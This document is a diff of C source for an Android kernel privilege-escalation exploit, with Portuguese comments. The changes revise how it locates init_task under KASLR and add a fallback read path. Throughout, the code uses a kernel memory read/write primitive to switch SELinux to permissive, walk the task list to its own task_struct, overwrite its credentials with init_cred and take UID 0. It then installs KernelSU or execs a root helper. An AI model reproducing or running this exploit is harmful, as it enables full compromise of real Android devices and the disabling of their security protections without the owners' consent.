@@ -19,9 +19,6 @@ uint32_t root_uid_after = 0xffffffff;
 #define TASK_STRUCT_PID_OFF       0x630   /* pid_t pid @ 1584 */
 #define TASK_STRUCT_COMM_OFF      0x848   /* char comm[16] @ 2120 */
 
-/* === init_task — endereço REAL do teu vmlinux === */
-#define INIT_TASK  0xffffffc00a2ff800ULL
-
 static int root_read_data(
     int fd, uintptr_t target, void *data, size_t len) {
   return pipe_phys_read_data(fd, target, data, len);
@@ -110,7 +107,6 @@ static int root_hold_socket_ready(void) {
 
 /*
  * Método 1: Scan da stack (heurística original).
- * Funciona se o kernel deixou o ponteiro task_struct na stack do usuário.
  */
 static uintptr_t root_get_current_task_stack_scan(int fd) {
   uint64_t sp = 0;
@@ -120,23 +116,19 @@ static uintptr_t root_get_current_task_stack_scan(int fd) {
     uint64_t val = 0;
     if (!root_read64(fd, addr, &val)) continue;
 
-    /* Heuristica: task_struct esta em vmalloc area (ffff8000... ou ffffffc0...) */
     if ((val & 0xffff800000000000ULL) != 0xffff800000000000ULL)
       continue;
 
-    /* Verifica se cred aponta para init_cred ou outro cred valido */
     uint64_t cred = 0;
     if (!root_read64(fd, val + TASK_STRUCT_CRED_OFF, &cred)) continue;
     if ((cred & 0xffff800000000000ULL) != 0xffff800000000000ULL)
       continue;
 
-    /* Verifica se real_cred tambem e valido */
     uint64_t real_cred = 0;
     if (!root_read64(fd, val + TASK_STRUCT_REAL_CRED_OFF, &real_cred)) continue;
     if ((real_cred & 0xffff800000000000ULL) != 0xffff800000000000ULL)
       continue;
 
-    /* Verifica comm (nome do processo) para confirmar */
     char comm[16] = {0};
     if (root_read_data(fd, val + TASK_STRUCT_COMM_OFF, comm, 15)) {
       if (comm[0] != '\0') {
@@ -152,28 +144,30 @@ static uintptr_t root_get_current_task_stack_scan(int fd) {
 
 /*
  * Método 2: Task list walk via PID.
- * Muito mais robusto: caminha a lista de tasks a partir de init_task
- * até encontrar nosso PID. Não depende de leaks na stack.
+ * USA data_addr(INIT_TASK) para resolver KASLR corretamente!
  */
 static uintptr_t root_get_current_task_pid_walk(int fd) {
   pid_t my_pid = getpid();
-  uintptr_t init_task_addr = INIT_TASK;
 
-  pr_info("root inline: PID walk looking for pid=%d from init_task=%016zx\n",
-          my_pid, init_task_addr);
+  /* === CORREÇÃO CRÍTICA: usa data_addr() para resolver KASLR === */
+  uintptr_t init_task_addr = data_addr(INIT_TASK);
 
-  /* Sanity: init_task deve estar em área de kernel */
-  if ((init_task_addr & 0xffff800000000000ULL) != 0xffff800000000000ULL) {
-    pr_error("root inline: INIT_TASK address looks wrong: %016zx\n", init_task_addr);
-    return 0;
-  }
+  pr_info("root inline: PID walk looking for pid=%d from init_task=%016zx "
+          "(raw=%016zx)\n", my_pid, init_task_addr, (uintptr_t)INIT_TASK);
 
   /* Lê o ponteiro 'tasks' de init_task (list_head.next) */
   uint64_t first_tasks = 0;
   if (!root_read64(fd, init_task_addr + TASK_STRUCT_TASKS_OFF, &first_tasks)) {
     pr_error("root inline: failed to read init_task.tasks at %016zx\n",
              init_task_addr + TASK_STRUCT_TASKS_OFF);
-    return 0;
+    /* Fallback: tenta ler via configfs (mais confiável) */
+    if (!root_read_global(fd, init_task_addr + TASK_STRUCT_TASKS_OFF, 
+                          &first_tasks, sizeof(first_tasks))) {
+      pr_error("root inline: configfs fallback also failed\n");
+      return 0;
+    }
+    pr_info("root inline: configfs fallback read ok, first_tasks=%016zx\n",
+            first_tasks);
   }
 
   pr_info("root inline: init_task.tasks.next=%016zx\n", first_tasks);
@@ -182,12 +176,12 @@ static uintptr_t root_get_current_task_pid_walk(int fd) {
    * task_struct = tasks_ptr - TASK_STRUCT_TASKS_OFF
    */
   uintptr_t current_tasks = first_tasks;
-  const int max_iter = 20000;  /* proteção contra loop infinito */
+  const int max_iter = 20000;
 
   for (int i = 0; i < max_iter; i++) {
     uintptr_t task = current_tasks - TASK_STRUCT_TASKS_OFF;
 
-    /* Sanity check: deve estar em área de kernel alta */
+    /* Sanity check: deve estar em área de kernel */
     if ((task & 0xffff800000000000ULL) != 0xffff800000000000ULL) {
       pr_error("root inline: task list corrupted at iter=%d task=%016zx\n", i, task);
       return 0;
@@ -205,8 +199,8 @@ static uintptr_t root_get_current_task_pid_walk(int fd) {
       }
     }
 
-    /* Debug: mostra os primeiros 5 PIDs pra ver se a lista tá saudável */
-    if (i < 5) {
+    /* Debug: mostra os primeiros 10 PIDs */
+    if (i < 10) {
       char comm[16] = {0};
       root_read_data(fd, task + TASK_STRUCT_COMM_OFF, comm, 15);
       pr_info("root inline: walk[%d] task=%016zx pid=%d comm=%s\n", i, task, pid, comm);
@@ -220,7 +214,6 @@ static uintptr_t root_get_current_task_pid_walk(int fd) {
     }
 
     if (next_tasks == first_tasks || next_tasks == 0) {
-      /* Voltou ao início ou lista vazia */
       break;
     }
     current_tasks = next_tasks;
@@ -231,17 +224,12 @@ static uintptr_t root_get_current_task_pid_walk(int fd) {
   return 0;
 }
 
-/*
- * Tenta ambos os métodos para obter o task_struct atual.
- */
 static uintptr_t root_get_current_task(int fd) {
   uintptr_t task = 0;
 
-  /* Tenta PID walk primeiro (mais robusto) */
   task = root_get_current_task_pid_walk(fd);
   if (task) return task;
 
-  /* Fallback: stack scan */
   pr_info("root inline: PID walk failed, trying stack scan fallback\n");
   task = root_get_current_task_stack_scan(fd);
   if (task) return task;
@@ -249,10 +237,6 @@ static uintptr_t root_get_current_task(int fd) {
   return 0;
 }
 
-/*
- * Inline root escalation — sem fork+exec, sem binario externo.
- * O proprio processo do exploit vira root e instala o KernelSU.
- */
 static int install_inline_root(int fd) {
   uintptr_t selinux_addr = data_addr(SELINUX_ENFORCING);
   uint8_t permissive = 0;
@@ -261,7 +245,6 @@ static int install_inline_root(int fd) {
   int selinux_changed = 0;
   int result = 0;
 
-  /* Read current SELinux state */
   int selinux_read = root_read_global(
       fd, selinux_addr, &selinux_old, sizeof(selinux_old));
   if (!selinux_read) {
@@ -275,7 +258,6 @@ static int install_inline_root(int fd) {
   }
   pr_info("root selinux addr=%016zx old=%u\n", selinux_addr, selinux_old);
 
-  /* Disable SELinux enforcing */
   if (selinux_old != permissive) {
     selinux_changed = 1;
     if (!root_write_global(fd, selinux_addr, &permissive,
@@ -290,8 +272,6 @@ static int install_inline_root(int fd) {
     pr_info("root selinux disabled\n");
   }
 
-  /* === INLINE PRIVESC === */
-  /* 1. Achar o proprio task_struct */
   uintptr_t current_task = root_get_current_task(fd);
   if (!current_task) {
     pr_error("root inline: failed to find current task_struct\n");
@@ -299,7 +279,6 @@ static int install_inline_root(int fd) {
   }
   pr_info("root inline: current_task=%016zx\n", current_task);
 
-  /* 2. Escrever init_cred em cred e real_cred */
   uint64_t init_cred = INIT_CRED_OFF;
   if (!root_write64_exact(fd, current_task + TASK_STRUCT_CRED_OFF, init_cred) ||
       !root_write64_exact(fd, current_task + TASK_STRUCT_REAL_CRED_OFF, init_cred)) {
@@ -308,9 +287,7 @@ static int install_inline_root(int fd) {
   }
   pr_info("root inline: cred -> init_cred\n");
 
-  /* 3. Aplicar no userspace */
   if (setuid(0) != 0) {
-    /* Fallback: syscall direto se seccomp bloquear libc */
     syscall(__NR_setuid, 0);
   }
   if (setgid(0) != 0) {
@@ -323,7 +300,6 @@ static int install_inline_root(int fd) {
   }
   pr_info("root inline: UID=0 GID=0 achieved\n");
 
-  /* 4. Instalar KernelSU (ou outra acao permanente) */
   const char *ksud_path = "/data/local/tmp/ksud";
   if (access(ksud_path, X_OK) == 0) {
     pr_info("root inline: installing KernelSU via %s\n", ksud_path);
@@ -335,12 +311,10 @@ static int install_inline_root(int fd) {
       pr_error("root inline: ksud install failed ret=%d\n", ret);
     }
   } else {
-    /* Se nao tem ksud, tenta abrir shell root como fallback */
     pr_info("root inline: ksud not found, attempting shell\n");
-    result = 1; /* Sucesso parcial — root obtido, mas sem instalacao permanente */
+    result = 1;
   }
 
-  /* Criar socket de sinalizacao para o framework (compatibilidade) */
   if (result) {
     int sock = socket(AF_UNIX, SOCK_STREAM, 0);
     if (sock >= 0) {
@@ -351,7 +325,6 @@ static int install_inline_root(int fd) {
       unlink(ROOT_SOCKET_PATH);
       if (bind(sock, (struct sockaddr *)&sun, sizeof(sun)) == 0) {
         listen(sock, 1);
-        /* Aceita uma conexao e fecha (sinaliza pronto) */
         int client = accept(sock, NULL, NULL);
         if (client >= 0) close(client);
       }
@@ -361,7 +334,6 @@ static int install_inline_root(int fd) {
   }
 
 cleanup:
-  /* Restore SELinux se falhou */
   if (selinux_changed && !result) {
     uint8_t current = 0xff;
     int read_ok = root_read_global(fd, selinux_addr, &current,
@@ -387,10 +359,6 @@ cleanup:
   return result;
 }
 
-/*
- * Ghostwire path fallback: fork+exec com binario externo.
- * Mantido para compatibilidade, mas nao e mais usado por padrao.
- */
 static int install_forkexec_root(int fd) {
   uintptr_t selinux_addr = data_addr(SELINUX_ENFORCING);
   uint8_t permissive = 0;
@@ -415,7 +383,6 @@ static int install_forkexec_root(int fd) {
     return 0;
   }
 
-  /* Read current SELinux state */
   int selinux_read = root_read_global(
       fd, selinux_addr, &selinux_old, sizeof(selinux_old));
   if (!selinux_read) {
@@ -431,7 +398,6 @@ static int install_forkexec_root(int fd) {
 
   unlink(ROOT_SOCKET_PATH);
 
-  /* Disable SELinux enforcing */
   if (selinux_old != permissive) {
     selinux_changed = 1;
     if (!root_write_global(fd, selinux_addr, &permissive,
@@ -446,7 +412,6 @@ static int install_forkexec_root(int fd) {
     pr_info("root selinux disabled\n");
   }
 
-  /* Fork and exec root helper directly */
   char uid_str[16];
   snprintf(uid_str, sizeof(uid_str), "%u", getuid());
 
@@ -457,7 +422,6 @@ static int install_forkexec_root(int fd) {
   }
 
   if (pid == 0) {
-    /* Child process: exec root helper */
     char *argv[] = {
       (char *)root_umh_path,
       (char *)"--umh",
@@ -469,13 +433,11 @@ static int install_forkexec_root(int fd) {
     _exit(127);
   }
 
-  /* Parent: wait for socket */
   for (int i = 0; i < 300; i++) {
     if (root_socket_ready()) {
       socket_ok = 1;
       break;
     }
-    /* Also reap child if it died early */
     int status;
     if (waitpid(pid, &status, WNOHANG) == pid) {
       pr_error("root helper exited early status=%d\n", WEXITSTATUS(status));
@@ -490,14 +452,12 @@ static int install_forkexec_root(int fd) {
 
   result = socket_ok;
 
-  /* If child is still running but socket never appeared, kill it */
   if (!socket_ok) {
     kill(pid, SIGKILL);
     waitpid(pid, NULL, 0);
   }
 
 cleanup:
-  /* Restore SELinux if we changed it and root didn't fully succeed */
   if (selinux_changed && !result) {
     uint8_t current = 0xff;
     int read_ok = root_read_global(fd, selinux_addr, &current,
@@ -527,10 +487,6 @@ int install_android_root(int fd) {
   root_uid_before = getuid();
   pr_info("root configfs-pipe start uid=%u fd=%d\n", root_uid_before, fd);
 
-  /*
-   * Tenta inline primeiro (sem binario externo).
-   * Se falhar, cai no fork+exec como fallback.
-   */
   int result = install_inline_root(fd);
   if (!result) {
     pr_info("root inline failed, trying fork+exec fallback\n");
